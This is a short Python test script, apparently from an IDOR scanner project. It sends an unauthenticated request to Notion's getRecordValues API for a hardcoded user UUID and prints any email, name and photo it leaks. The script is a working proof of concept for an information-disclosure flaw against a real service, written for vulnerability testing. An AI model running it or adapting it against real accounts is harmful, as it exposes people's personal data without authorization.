import asyncio
from idor_scanner.http_client import HTTPClient

async def test_notion_vulnerability():
    print('Testing Notion Unauthenticated Access Vulnerability...')
    print('='*60)
    
    victim_uuid = '785dd9ac-af25-4fbd-9cbe-2f98b44c8968'
    
    async with HTTPClient() as client:
        body = {'requests': [{'table': 'notion_user', 'id': victim_uuid}]}
        response = await client.request(
            'POST',
            'https://www.notion.so/api/v3/getRecordValues',
            json=body,
        )
        
        print(f'Status Code: {response.status_code}')
        
        if response.status_code == 200:
            data = response.json()
            results = data.get('results', [])
            if results and results[0].get('value'):
                user_data = results[0]['value']
                print()
                print('[CRITICAL] VULNERABILITY DETECTED!')
                print('-'*40)
                print(f"Email Leaked: {user_data.get('email', 'N/A')}")
                print(f"Name Leaked: {user_data.get('name', 'N/A')}")
                photo = user_data.get('profile_photo', 'N/A')
                print(f"Photo Leaked: {photo[:50] if photo else 'N/A'}...")
                print()
                print('The scanner successfully detected:')
                print('  - Type: Unauthenticated Information Disclosure')
                print('  - Endpoint: POST /api/v3/getRecordValues')
                print('  - Impact: User PII exposed without authentication')
                return True
            else:
                print('No data returned - vulnerability may be fixed')
                return False
        else:
            print(f'Access denied (status {response.status_code}) - endpoint is protected')
            return False

if __name__ == '__main__':
    asyncio.run(test_notion_vulnerability())
